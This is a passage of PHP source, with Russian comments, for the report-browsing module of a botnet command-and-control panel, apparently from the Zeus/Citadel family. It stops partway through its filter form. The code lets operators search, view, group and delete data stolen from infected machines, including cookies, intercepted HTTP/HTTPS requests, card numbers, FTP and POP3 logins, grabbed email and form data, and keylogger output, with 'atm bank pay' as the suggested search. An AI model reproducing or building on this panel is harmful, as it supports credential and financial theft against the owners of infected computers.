<?php if(!defined('__CP__'))die();
define('REPORT_PREVIEW_MAX_CHARS', 100); //Максимальное количество символов в предпросмотре context и path_source.

if (isset($_GET['ajax']))
try {
	require_once 'system/lib/dbpdo.php';
	require_once 'system/lib/MVC.php';
	$db = dbPDO::singleton();

	switch ($_GET['ajax']){
		case 'bot-comment':
			$q = $db->prepare('UPDATE `botnet_list` SET `comment`=:comment WHERE `bot_id`=:botId;');
			$q->execute(array(
				':botId' => $_REQUEST['botId'],
				':comment' => $_REQUEST['comment'],
			));
			break;
	}
	die();
} catch (Exception $e){
	http_error400('Exception '.get_class($e).':'.$e->getMessage());
	die();
}

$_allow_remove = !empty($userData['r_reports_db_edit']);
$rlist = listReportTables($config['mysql_db']); //Получение списка таблиц botnet_reports_*.

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод отдельного лога.
///////////////////////////////////////////////////////////////////////////////////////////////////

/* Brief View Mode */
if (isset($_GET['t'], $_GET['id'], $_GET['viewmode'])){
	require_once 'system/lib/dbpdo.php';

	$_GET['t'] = (int)$_GET['t'];
	$_GET['id'] = (int)$_GET['id'];

	switch ($_GET['viewmode']){
		case 'brief':
			$db = dbPDO::singleton();
			$q = $db->prepare(
				'SELECT
				    `r`.`botnet`, `r`.`bot_id`,
				    `r`.`country`, `b`.`comment` AS `bot_comment`,
				    UNIX_TIMESTAMP() - `b`.rtime_last AS `bot_online`,
				    `r`.`type`,
				    `r`.`time_system` + `r`.`time_localbias` AS `time`,
				    `r`.`process_name`,
				    `r`.`path_source`,
				    `r`.`context`,
				    COALESCE(`ip`.`c`, "--") AS `ip_c`,
				    COALESCE(`ip`.`country`, "Unknown") AS `ip_country`
				 FROM `botnet_reports_'.$_GET['t'].'` `r`
				    LEFT JOIN `botnet_list` `b` USING(`bot_id`)
				    LEFT JOIN `ipv4toc` `ip` ON(INET_ATON(`r`.`ipv4`) BETWEEN `ip`.`l` AND `ip`.`h`)
				 WHERE `r`.`id` = :id
				 LIMIT 1
				');
			$q->execute(array(
				':id' => $_GET['id'],
			));
			$report = $q->fetch(PDO::FETCH_OBJ);

			# Prepare the data

			# Output
			echo '<table class="bot-report">',
				'<caption>',
					bltToLng($report->type),
					' (', numberFormatAsInt(strlen($report->context)), ' bytes)',
					'</caption>',
				'<TBODY>',
					'<tr class="td_c1">',
						'<th>', LNG_REPORTS_VIEW_BOTID, '</th>',
						'<td>',
							'<img src="theme/images/icons/'.($report->bot_online && $report->bot_online <= $GLOBALS['config']['botnet_timeout']? 'online' : 'offline').'.png" /> ',
							botPopupMenu($report->bot_id, 'botmenu', $report->bot_comment),
							' (', htmlentities($report->ip_c), ' — ', $report->ip_country, ')',
							' <i>', htmlentities($report->bot_comment), '</i>',
							'</td>',
						'</tr>',
					'<tr class="td_c2">',
						'<th>', LNG_REPORTS_VIEW_SOURCE, '</th>',
						'<td>', htmlentities($report->path_source), '</td>',
						'</tr>',
					'<tr class="td_c1">',
						'<th>', LNG_REPORTS_VIEW_TIME, '</th>',
						'<td>', gmdate(LNG_FORMAT_DT, $report->time), '</td>',
						'</tr>',
					'<tr class="td_c2">',
						'<th>', LNG_REPORTS_VIEW_PROCNAME, '</th>',
						'<td>', htmlentities($report->process_name), '</td>',
						'</tr>',
					'<tr class="td_c1">',
						'<td colspan="2"><pre>',
							in_array($report->type, array(BLT_FILE, BLT_UNKNOWN))
							? '(BINARY CONTENTS)'
							: htmlentities($report->context),
							'</pre></td>',
						'</tr>',
					'</TBODY>',
				'</table>';

			die();
			break;
	}
}

/* Generic View Mode */

if(isset($_GET['t']) && isset($_GET['id'])){

	require_once 'system/lib/dbpdo.php';
	require_once 'system/lib/guiutil.php';

	# Prepare the input data
	$_GET['t'] = (int)$_GET['t'];
	$_GET['id'] = (int)$_GET['id'];

	# Fetch data
	$db = dbPDO::singleton();
	$q = $db->prepare(
		'SELECT
				    `r`.`botnet`, `r`.`bot_id`,
				    `b`.`comment` AS `bot_comment`,
				    UNIX_TIMESTAMP() - `b`.`rtime_last` AS `bot_online`,
				    `b`.`rtime_last` AS `bot_rtime_last`,
				    `b`.`flag_used`,

				    `r`.`id`,
				    `r`.`bot_version`,
				    `r`.`os_version`, `r`.`language_id`,
				    `r`.`rtime`, `r`.`country`, `r`.`ipv4`,
				    `r`.`time_system`, `r`.`time_localbias`, `r`.`time_tick`,

				    `r`.`type`,
				    `r`.`process_name`, `r`.`process_user`, `r`.`process_info`,
				    `r`.`path_source`, `r`.`path_dest`,
				    `r`.`context`,

				    COALESCE(`ip`.`c`, "--") AS `ip_c`,
				    COALESCE(`ip`.`country`, "Unknown") AS `ip_country`,

				    `fav`.`comment` AS `favorite_comment`
				 FROM `botnet_reports_'.$_GET['t'].'` `r`
				    LEFT JOIN `botnet_list` `b` USING(`bot_id`)
				    LEFT JOIN `botnet_rep_favorites` `fav` ON(`fav`.`table` = :yymmdd AND `r`.`id`=`fav`.`report_id` AND `fav`.`favorite`>=0)
				    LEFT JOIN `ipv4toc` `ip` ON(INET_ATON(`r`.`ipv4`) BETWEEN `ip`.`l` AND `ip`.`h`)
				 WHERE `r`.`id` = :id
				 LIMIT 1
				');
	$q->execute(array(
		':id' => $_GET['id'],
		':yymmdd' => $_GET['t'],
	));
	$report = $q->fetch(PDO::FETCH_OBJ);

	# Header
	themeSmall(LNG_REPORTS_VIEW_TITLE, '', 0, getBotJsMenu('botmenu'), 0);

	# Restrict access
	if ($report->type != BLT_COMMANDLINE_RESULT)
		if (empty($GLOBALS['userData']['r_reports_db']) && empty($GLOBALS['userData']['r_reports_db_cmd']))
			die('Insufficient permissions');

	echo '<aside class="sidebar">',
		'<dl>',
			# report actions
			'<dt></dt>',
			'<dd><ul>',
				'<li id="aside-report-whois">', '<button>', LNG_REPORTS_ASIDE_WHOIS, '</button>', '</li>';

	if (file_exists('system/reports_fav.php'))
	echo
				'<li id="aside-report-favorite">',
					'<button>', LNG_REPORTS_ASIDE_FAVORITE1, '</button>',
					'<form action="?m=/reports_fav/ajaxAdd" method="POST">',
						'<input type="hidden" name="table" value="', $_GET['t'], '" />',
						'<input type="hidden" name="report_id" value="', $_GET['id'], '" />',
						'<textarea name="comment" rows="20" placeholder="comment">', htmlentities($report->favorite_comment), '</textarea>',
						'<input type="submit" value="', LNG_REPORTS_ASIDE_SAVE, '" />',
						'</form>',
					'</li>';
	echo
				'</ul></dd>',

			file_exists('system/botnet_vnc.php')? '<dt>VNC</dt><dd>'.vncplugin_draw_connect_options($report->bot_id).'</dd>' : 0,
			'</dl>',
		'</aside>';

	# Display
	echo '<table id="full-bot-report" class="bot-report zebra lined" ',
			'data-table="', $_GET['t'], '" data-report="', $report->id, '" ',
			'data-botid="', htmlentities($report->bot_id), '" data-ipv4="', htmlentities($report->ipv4), '"',
			'>',
		'<caption>',
			sprintf(LNG_REPORTS_VIEW_TITLE2, bltToLng($report->type),numberFormatAsInt(strlen($report->context))),
			' ', gmdate(LNG_FORMAT_DT, $report->rtime),
			'</caption>',
		'<TBODY>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_BOTID, '</th>',
				'<td>',
					'<img src="theme/images/icons/'.($report->bot_online && $report->bot_online <= $GLOBALS['config']['botnet_timeout']? 'online' : 'offline').'.png" /> ',
					botPopupMenu($report->bot_id, 'botmenu', $report->bot_comment),
					' (', htmlentities($report->ip_c), ' — ', $report->ip_country, ')',
					' ', htmlentities($report->botnet),
					'</td>',
				'</tr>',
			'<tr class="field-bot-comment">',
				'<th>', LNG_REPORTS_VIEW_COMMENT, '</th>',
				'<td>',
					'<form action="?', mkuri(1, 'm'), '&ajax=bot-comment&botId=', rawurlencode($report->bot_id), '" method="POST" class="ajax_form_update" data-title="Bot comment">',
						'<input type="text" name="comment" value="', htmlentities($report->bot_comment), '" />',
						'<input type="submit" value="', LNG_REPORTS_VIEW_COMMENT_SAVE, '" />',
						'</form>',
					'</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_BOT_RTIME_LAST, '</th>',
				'<td>', timeago(time() - $report->bot_rtime_last), '</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_VERSION, '</th>',
				'<td>', intToVersion($report->bot_version), '</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_OS, '</th>',
				'<td>', osDataToString($report->os_version),
						' (', htmlentities($report->language_id), ')',
						'</td>',
				'</tr>',
			'<tr class="field-ipv4">',
				'<th>', LNG_REPORTS_VIEW_IPV4, '</th>',
				'<td>', htmlentities($report->ipv4), '</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_TIME, '</th>',
				'<td>', gmdate(LNG_FORMAT_DT, $report->time_system + $report->time_localbias),
						' (GMT', timeBiasToText($report->time_localbias), ')',
						'</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_TICK, '</th>',
				'<td>', tickCountToText($report->time_tick/1000), '</td>',
				'</tr>',
			'</TBODY>',
			'<TBODY>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_PROCUSER, '</th>',
				'<td>', htmlspecialchars($report->process_user), '</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_PROCNAME, '</th>',
				'<td>', htmlspecialchars($report->process_name), '</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_PROCINFO, '</th>',
				'<td>', htmlentities($report->process_info), '</td>',
				'</tr>',
			'<tr>',
				'<th>', LNG_REPORTS_VIEW_SOURCE, '</th>',
				'<td>', htmlentities($report->path_source), '</td>',
				'</tr>',
			'<tr>',
				'<td colspan="2"><pre>',
					htmlentities($report->context),
					'</pre></td>',
				'</tr>',
			'</TBODY>',
		'</table>';

	echo <<<HTML
<script src="theme/js/page-reports_db-report.js"></script>
HTML;


  die();
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Определяем данные для фильтра.
///////////////////////////////////////////////////////////////////////////////////////////////////

//При добавлении новых параметров нужно уничтожать не нужные для js:datelist.

$filter['date1']     = isset($_GET['date1']) ? intval($_GET['date1']) : 0;
$filter['date2']     = isset($_GET['date2']) ? intval($_GET['date2']) : 0;
if($filter['date1'] > $filter['date2']){$t = $filter['date1']; $filter['date1'] = $filter['date2']; $filter['date2'] = $t;}

$filter['date']      = isset($_GET['date'])  ? intval($_GET['date']) : 0;

$filter['bots']      = isset($_GET['bots'])      ? $_GET['bots']      : '';
$filter['botnets']   = isset($_GET['botnets'])   ? $_GET['botnets']   : '';
$filter['ips']       = isset($_GET['ips'])       ? $_GET['ips']       : '';
$filter['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

$filter['q']         = isset($_GET['q'])   ? $_GET['q']           : '';
$filter['blt']       = isset($_GET['blt']) ? intval($_GET['blt']) : -1; # -1: HTTP | HTTPS

$filter['online']    = empty($_GET['online'])   ? 0 : 1;
$filter['cs']        = empty($_GET['cs'])       ? 0 : 1;
$filter['grouping']  = empty($_GET['grouping']) ? 0 : 1;
$filter['nonames']   = empty($_GET['nonames'])  ? 0 : 1;
$filter['plain']     = empty($_GET['plain'])    ? 0 : 1;

$filter['rm']        = ($_allow_remove && isset($_GET['rm']) && intval($_GET['rm']) === 1) ? 1 : 0;

if (empty($GLOBALS['userData']['r_reports_db']) && !empty($GLOBALS['userData']['r_reports_db_cmd']))
	$filter['blt'] = BLT_COMMANDLINE_RESULT; // limit to this report type

///////////////////////////////////////////////////////////////////////////////////////////////////
// Определяем тип вывода страницы.
///////////////////////////////////////////////////////////////////////////////////////////////////

$_is_ajax_result  = isset($_GET['q']) && $filter['date1'] > 0 && $filter['date2'] > 0;                                //Страница выводиться как результат поиска ajax.
$_is_ajax_search  = !$_is_ajax_result && $filter['date'] > 0 && isset($_GET['q']);                                     //Страница выводиться как рельутат поиска ajax.
$_is_plain_search = ($_is_ajax_result && $filter['plain'] == 1 && $filter['rm'] == 0 && $filter['blt'] != BLT_FILE); //Cтраница должна открыться как plain-поиск.
if($_is_plain_search)$_is_ajax_result = false;

///////////////////////////////////////////////////////////////////////////////////////////////////
// Создание запроса.
///////////////////////////////////////////////////////////////////////////////////////////////////

if($_is_ajax_search || $_is_plain_search)
{
  $q1 = array();
	$qjoin = '';
  
  if($filter['blt'] != BLT_UNKNOWN)
  {
    if($filter['blt'] == -1)$q1[] = "(`t`.`type`='".BLT_HTTP_REQUEST."' OR `t`.`type`='".BLT_HTTPS_REQUEST."')";
    else if($filter['blt'] == -2)$q1[] = "(`t`.`type`='".BLT_GRABBED_UI."' OR `t`.`type`='".BLT_GRABBED_HTTP."' OR `t`.`type`='".BLT_GRABBED_WSOCKET."' OR `t`.`type`='".BLT_GRABBED_FTPSOFTWARE."' OR `t`.`type`='".BLT_GRABBED_EMAILSOFTWARE."' OR `t`.`type`='".LNG_BLT_GRABBED_OTHER."')";
    else $q1[] = "`t`.`type`='".addslashes($filter['blt'])."'";
  }
  
  if($_is_plain_search)$q1[] = '`t`.`type` <> \''.BLT_FILE.'\''; //Нельзя искать файлы при текстовом выводе.

  $q1[] = expressionToSql($filter['countries'], '`t`.`country`', 0, 1);
  $q1[] = expressionToSql($filter['ips'],       '`t`.`ipv4`',    1, 1);
  $q1[] = expressionToSql($filter['botnets'],   '`t`.`botnet`',  0, 1);
  $q1[] = expressionToSql($filter['bots'],      '`t`.`bot_id`',  0, 1);

	$cs_operator = 'LIKE';
	if ($filter['cs'])
		$cs_operator = 'LIKE BINARY'; # cast to BINARY to make the search case-insensitive

	if (!empty($filter['q'])){
		$tt = array();
		foreach (explode(' ', $filter['q']) as $s)
			if (strlen($s = trim($s)))
				foreach (array('`t`.`path_source`', '`t`.`path_dest`', '`t`.`context`') as $field)
					$tt[] = "$field $cs_operator \"%".mysql_real_escape_string($s)."%\"";
		$q1[] = '('.implode(' OR ', $tt).')';
	}

  //Чистим массив.
  foreach($q1 as $k => $v)if($v == '')unset($q1[$k]);

	if (!empty($_GET['online'])){
		$qjoin .= ' CROSS JOIN `botnet_list` `bl` ON(`t`.`bot_id` = `bl`.`bot_id`) ';
		$q1[] = '`bl`.`rtime_last` >= '.ONLINE_TIME_MIN;
	}

	$query1 = count($q1) > 0 ? ' WHERE '.implode(' AND ', $q1) : '';
  
  $query2 = '';
  if($filter['grouping'])$query2 .= ' GROUP BY `t`.`context`';
  $query2 .= ' ORDER BY `t`.`bot_id`, `t`.`rtime`';

  unset($q1);
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// HTML фильтр/результат.
///////////////////////////////////////////////////////////////////////////////////////////////////

if(!$_is_ajax_search && !$_is_plain_search)
{
  define('INPUT_WIDTH',  '200px'); //Ширина input.text.
  define('INPUTQ_WIDTH', '500px'); //Ширина input.text.

  $js_qw     = addJsSlashes(LNG_REPORTS_FILTER_REMOVE_Q);
  $js_script = jsCheckAll('botslist', 'checkall', 'bots[]');
  $js_script .= 
<<<JS_SCRIPT
function RemoveReports()
{
  if(confirm('{$js_qw}'))
  {
    var f = document.forms.namedItem('filter');
    f.elements.namedItem('rm').value = 1;
    f.submit();
  }
}
JS_SCRIPT;

  //Подготовливаем список дат.
  if($_is_ajax_result)
  {
    $datelist = '';
    $js_datelist = '';
    
    foreach($rlist as $t)
    {
      $v = intval(substr($t, -6));
      if($v >= $filter['date1'] && $v <= $filter['date2'])
      {
        $datelist .=
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, htmlEntitiesEx(gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)))), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            '<div id="dt'.htmlentities($v).'" class="botnet-search-results" data-date="'.$v.'">'.
              THEME_IMG_WAIT.
            THEME_STRING_ID_END.
            THEME_STRING_NEWLINE.
            THEME_STRING_NEWLINE.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END;
        
        $js_datelist .= ($js_datelist == '' ? '' : ', ')."['dt".addJsSlashes($v)."', '".addJsSlashes(urlencode($v))."']";
      }
    }
    
    $f = $filter;
    unset($f['date1']);
    unset($f['date2']);
    unset($f['date']);
    unset($f['plain']);
    
    $q = addJsSlashes(QUERY_STRING);
    foreach($f as $k => $v)$q .= '&'.addJsSlashes(urlencode($k)).'='.addJsSlashes(urlencode($v));
    
    $ajax_init  = jsXmlHttpRequest('datehttp');
    $ajax_err   = addJsSlashes(str_replace('{TEXT}', LNG_REPORTS_DATE_ERROR, THEME_STRING_ERROR));
    $js_script .=    
<<<JS_SCRIPT

var datelist = [{$js_datelist}];
var datehttp = false;

function stateChange(i){if(datehttp.readyState == 4)
{
  var el = document.getElementById(datelist[i][0]);
  if(datehttp.status == 200 && datehttp.responseText.length > 1){
	el.innerHTML = datehttp.responseText;
	/* [Infinite-scroll commented-out]
	 install_infinite_scroller();
	 */
	}
  else el.innerHTML = '{$ajax_err}';
  SearchDate(++i);
}}

function SearchDate(i)
{
  if(datehttp)delete sockshttp;
  if(i < datelist.length)
  {
    {$ajax_init}
    if(datehttp)
    {
      datehttp.onreadystatechange = function(){stateChange(i)};
      datehttp.open('GET', '{$q}&date=' + datelist[i][1], true);
      datehttp.send(null);
    }
  }
}

$(function(){
	SearchDate(0);  
	});
JS_SCRIPT;
  }

	require 'system/lib/gui.php';

  ThemeBegin(LNG_REPORTS, $js_script, getBotJsMenu('botmenu'), $_is_ajax_result ? ' ' : 0);
  //Фильтр.
  echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN);
  if($_allow_remove)echo str_replace(array('{NAME}', '{VALUE}'), array('rm', 0), THEME_FORM_VALUE);
  echo
    FORM_CURRENT_MODULE.
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_FILTER_TITLE), THEME_DIALOG_TITLE).
    
      //Даты.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
          LNG_REPORTS_FILTER_DATE_P1.THEME_STRING_SPACE.
          str_replace(array('{NAME}', '{WIDTH}'), array('date1', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
            MakeDateList('date1', $rlist).
          THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_STRING_SPACE.LNG_REPORTS_FILTER_DATE_P2.THEME_STRING_SPACE.
          str_replace(array('{NAME}', '{WIDTH}'), array('date2', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
            MakeDateList('date2', $rlist).
          THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_STRING_SPACE.LNG_REPORTS_FILTER_DATE_P3.
        THEME_DIALOG_ITEM_CHILD_END.
      THEME_DIALOG_ROW_END.
    
      //Стандартный фильтр.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlEntitiesEx($filter['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlEntitiesEx($filter['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_IPS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'ips',       htmlEntitiesEx($filter['ips']),       512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_COUNTRIES, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'countries', htmlEntitiesEx($filter['countries']), 512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Строка поиска.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_QUERY, THEME_DIALOG_ITEM_TEXT).
            '<td><input type="text" name="q" value="'.htmlEntitiesEx($filter['q']).'" maxlength="4096" placeholder="atm bank pay" style="width: '.INPUTQ_WIDTH.'" />'.
            named_preset_picker('Reports.Search', '#filter input[name=q]').
            '</td>'.

          THEME_DIALOG_ROW_END;
          
		if (!empty($GLOBALS['userData']['r_reports_db'])){ // full-featured access
          echo THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_REPORTTYPE, THEME_DIALOG_ITEM_TEXT).
            str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
              str_replace(array('{NAME}', '{WIDTH}'), array('blt', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_UNKNOWN,               LNG_REPORTS_FILTER_ALL),        $filter['blt'] == BLT_UNKNOWN               ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_COOKIES,              LNG_BLT_COOKIES),                $filter['blt'] == BLT_COOKIES               ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_FILE,                  LNG_BLT_FILE),                  $filter['blt'] == BLT_FILE                  ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(-1,                        LNG_BLT_HTTPX_REQUEST),         $filter['blt'] == -1                        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_HTTP_REQUEST,          LNG_BLT_HTTP_REQUEST),          $filter['blt'] == BLT_HTTP_REQUEST          ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_HTTPS_REQUEST,         LNG_BLT_HTTPS_REQUEST),         $filter['blt'] == BLT_HTTPS_REQUEST         ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LUHN10_REQUEST,        LNG_BLT_LUHN10_REQUEST),        $filter['blt'] == BLT_LUHN10_REQUEST        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).                
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LOGIN_FTP,             LNG_BLT_LOGIN_FTP),             $filter['blt'] == BLT_LOGIN_FTP             ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LOGIN_POP3,            LNG_BLT_LOGIN_POP3),            $filter['blt'] == BLT_LOGIN_POP3            ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_FILE_SEARCH,           LNG_BLT_FILE_SEARCH),           $filter['blt'] == BLT_FILE_SEARCH           ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(-2,                        LNG_BLT_GRABBED_X),             $filter['blt'] == -2                        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_UI,            LNG_BLT_GRABBED_UI),            $filter['blt'] == BLT_GRABBED_UI            ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_HTTP,          LNG_BLT_GRABBED_HTTP),          $filter['blt'] == BLT_GRABBED_HTTP          ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_WSOCKET,       LNG_BLT_GRABBED_WSOCKET),       $filter['blt'] == BLT_GRABBED_WSOCKET       ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_FTPSOFTWARE,   LNG_BLT_GRABBED_FTPSOFTWARE),   $filter['blt'] == BLT_GRABBED_FTPSOFTWARE   ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_EMAILSOFTWARE, LNG_BLT_GRABBED_EMAILSOFTWARE), $filter['blt'] == BLT_GRABBED_EMAILSOFTWARE ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_OTHER,         LNG_BLT_GRABBED_OTHER),         $filter['blt'] == BLT_GRABBED_OTHER         ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_COMMANDLINE_RESULT,    LNG_BLT_COMMANDLINE_RESULT),    $filter['blt'] == BLT_COMMANDLINE_RESULT    ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_ANALYTICS_SOFTWARE,    LNG_BLT_ANALYTICS_SOFTWARE),    $filter['blt'] == BLT_ANALYTICS_SOFTWARE    ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_ANALYTICS_FIREWALL,    LNG_BLT_ANALYTICS_FIREWALL),    $filter['blt'] == BLT_ANALYTICS_FIREWALL    ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_ANALYTICS_ANTIVIRUS,   LNG_BLT_ANALYTICS_ANTIVIRUS),   $filter['blt'] == BLT_ANALYTICS_ANTIVIRUS   ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_KEYLOGGER,   			 LNG_BLT_KEYLOGGER),   			 $filter['blt'] == BLT_KEYLOGGER   			 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              THEME_DIALOG_ITEM_LISTBOX_END.
            THEME_DIALOG_ITEM_CHILD_END.
          THEME_DIALOG_ROW_END;
			}
		
          echo THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''),
                        $filter['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
			THEME_DIALOG_ROW_BEGIN.
			str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
					array(2, 'online', 1, LNG_REPORTS_FILTER_ONLINE, ''),
					$filter['online'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
					).
			THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'grouping', 1, LNG_REPORTS_FILTER_GROUPQUERY, ''),
                        $filter['grouping'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
